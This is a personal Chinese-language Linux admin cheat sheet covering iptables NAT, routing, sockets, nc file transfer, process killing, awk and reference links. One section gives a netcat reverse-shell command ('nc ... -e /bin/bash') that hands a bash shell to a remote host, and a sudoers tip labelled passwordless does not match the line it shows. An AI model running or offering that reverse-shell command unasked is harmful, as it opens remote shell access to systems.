# 网络

```sh
# 添加IPtables路由规则
iptables -I INPUT -p tcp -s ip --dport port -j ACCEPT
# 添加默认路由
route add -net 0.0.0.0/24  gw 192.168.18.2 em1
route del  default gw 192.168.18.2 # 删除默认路由
# 删除路由规则链
iptables -F chainname

# 添加NAT规则
iptables  -A nat -s 10.255.175.76 -p tcp --dport 8880 -j ACCEPT

# 内网虚拟机机器通过`10.255.175.96`宿主机能访问外网的机器上网
iptables -t nat -A POSTROUTING  -s 10.255.175.0/24 -o eth0 -j SNAT --to 10.255.175.96

iptables -t nat -D  POSTROUTING  -s 10.255.175.0/24 -j SNAT --to 10.255.175.96

# 再在内网机器上将GATEWAY设置为`10.255.175.96`
```


````sh
# 开启转发并持久化
sysctl -p /etc/sysctl.conf
[root@slave02 ~]# cat /etc/sysctl.conf
# System default settings live in /usr/lib/sysctl.d/00-system.conf.
# To override those settings, enter new settings here, or in an /etc/sysctl.d/<name>.conf file
#
# For more information, see sysctl.conf(5) and sysctl.d(5).
vm.max_map_count=262144
vm.swappiness=10
net.ipv4.ip_forward = 1


# 删掉后原来内网ip由能ping 通 baidu.com转为不能ping通
iptables -t nat -A POSTROUTING  -s 10.255.175.0/24 -o eth0 -j SNAT --to 10.255.175.96
# 开机自启保存
iptables-save > /etc/sysconfig/iptables


# 能够上网的机器的nat表配置
[root@slave02 ~]# iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination
DOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL

Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
DOCKER     all  --  anywhere            !loopback/8           ADDRTYPE match dst-type LOCAL

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination
MASQUERADE  all  --  172.17.0.0/16        anywhere
MASQUERADE  tcp  --  172.17.0.2           172.17.0.2           tcp dpt:commplex-main

SNAT       all  --  10.255.175.0/24      anywhere             to:10.255.175.96

Chain DOCKER (2 references)
target     prot opt source               destination
RETURN     all  --  anywhere             anywhere
DNAT       tcp  --  anywhere             anywhere             tcp dpt:commplex-main to:172.17.0.2:5000


更改完成之后在内网机器(配置默认网关为'能上网的机器ip 96')上执行
systemctl restart network
后就可以通过能上网的机器连接baidu.com了
````


[iptables](http://www.zsythink.net/archives/1199)


## 修改网卡名称

```sh
/sbin/ip link set eth1 down
/sbin/ip link set eth1 name eth123
/sbin/ip link set eth123 up
```

[change network interface withou reboot](https://unix.stackexchange.com/questions/205010/centos-7-rename-network-interface-without-rebooting)
## 访问socket

```json
# 通过ss展示网络开放端口
ss -l

ss dst ip:prt|proctol

ncat -U /tmp/tbsocket1

socat -d -d TCP-LISTEN:8080,fork UNIX /
```

参考:

[/how-to-access-unix-domain-sockets-from-the-command-line](https://stackoverflow.com/questions/27195677/how-to-access-unix-domain-sockets-from-the-command-line)

[ss和 netstat区别](https://www.cnblogs.com/kevingrace/p/6211509.html)

## curl
```sh
# curl发送json
curl -H "Content-Type: application/json" --data @body.json http://localhost:8080/ui/webapp/conf
```


## nc传文件
```sh
#bash 需安装netcat
$ ./nc.exe -v 192.168.18.96 6666 < F:\\AntiyProjects\\src\\ng8w_3.6.5\\comps.py
bogon [192.168.18.96] 6666 (?) open

# 96 使用
[root@bogon python]# nc -v  -l  6666 > comps.py
Connection from 192.168.19.31 port 6666 [tcp/ircu-2] accepted
```



# 进程

## 根据端口号杀进程
```sh
netstat -ntulp
[17:18:40][root@pta-23b7fdb2a2b2407f:~]# netstat -ntulp|grep 127.0.0.*|grep python
[17:19:10][root@pta-23b7fdb2a2b2407f:~]# ps aux|grep 13386
[17:19:18][root@pta-23b7fdb2a2b2407f:~]# kill -9 13386
```

# 文件

## 解压与查看
```sh
# 不解压显示文件列表
tar -tvf *.tgz|*.tar
unzip -l *.zip

# 不解压查看文件内容
zcat *.zip
```
## 分割文件
```sh
split -b fsize fname -d -a 2 prefix_
```


## 检测远程端口是否打开
```shell
telnet ip port
nmap ip -p port
nc -v host port
```

## nc反向shell

```sh
反向 shell
在服务端访问客户端的 shell

服务器 192.168.11.2 访问本地 shell:

在服务器上: nc -l 1234
在本机: nc 192.168.11.2 1234 -e /bin/bash
```

[nc常用命令](https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017/12/12/netcat-usage/)


# 系统操作


## sudo 免密执行

使用`sudo visudo`或`vi /etc/sudoers`,在 root ALL=(ALL) ALL下面添加一行 your_user_name ALL=(ALL) ALL

[ubuntu sudoers](https://phpraxis.wordpress.com/2016/09/27/enable-sudo-without-password-in-ubuntudebian/)



## bash - dash的作用

[dash](https://stackoverflow.com/questions/8045479/whats-the-magic-of-a-dash-in-command-line-parameters)

[special chars](http://tldp.org/LDP/abs/html/special-chars.html#DASHREF2)


## 代理

https://wiki.archlinux.org/index.php/Proxy_server



## GCC 多版本共存

sudo apt install gcc-4.8

sudo apt install g++-4.8

sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 50

sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-4.8 50

https://www.jianshu.com/p/876934a6401f

https://stackoverflow.com/questions/21530577/fatal-error-python-h-no-such-file-or-directory


## tumx

ctrl + b %
ctrl + <-

http://mingxinglai.com/cn/2012/09/tmux/


## node error

```sh
echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p
```

参考:

https://stackoverflow.com/questions/22475849/node-js-what-is-enospc-error-and-how-to-solve


## AWK

打印第一列后的列
awk '{ $1=""; print $0 }'


 diff <(sort a.csv|grep 2019-08-27) <(sort b.csv|grep 2019-08-27)


https://unix.stackexchange.com/questions/184612/compare-two-csv-files

## [] [[]]
https://stackoverflow.com/questions/2188199/how-to-use-double-or-single-brackets-parentheses-curly-braces

https://stackoverflow.com/questions/13542832/difference-between-single-and-double-square-brackets-in-bash

## nginx daemon off

https://stackoverflow.com/questions/25970711/what-is-the-difference-between-nginx-daemon-on-off-option

## supervisord
https://stackoverflow.com/questions/19918177/starting-supervisord-as-root-or-not

## pip install without root

https://askubuntu.com/questions/363300/how-to-install-pip-python-to-user-without-root-access
https://stackoverflow.com/questions/15028648/is-it-acceptable-and-safe-to-run-pip-install-under-sudo

## can not find python.h
https://stackoverflow.com/questions/12379929/cant-find-python-h-file-on-centos


cd /opt/webeye/hedwig/src/admin/ && . $(pipenv --venv)/bin/activate && pip list|sort|awk '{print $1}' > /tmp/pip-requirements.txt


## awk

cat Pipfile| awk '{split($0,a,"="); print a[1]}'

https://stackoverflow.com/questions/8009664/how-to-split-a-delimited-string-into-an-array-in-awk

https://unix.stackexchange.com/questions/156919/splitting-a-column-using-awk

## exec python in bash

https://unix.stackexchange.com/questions/533156/using-python-in-a-bash-script

https://unix.stackexchange.com/questions/184726/how-to-include-python-script-inside-a-bash-script

https://stackoverflow.com/questions/2500436/how-does-cat-eof-work-in-bash?rq=1

https://stackoverflow.com/questions/41990072/how-to-execute-a-bash-script-from-a-python-string-in-jupyter-notebook

python3 - << EOF
#!/usr/bin/python
import json
import os
print('hi')
EOF
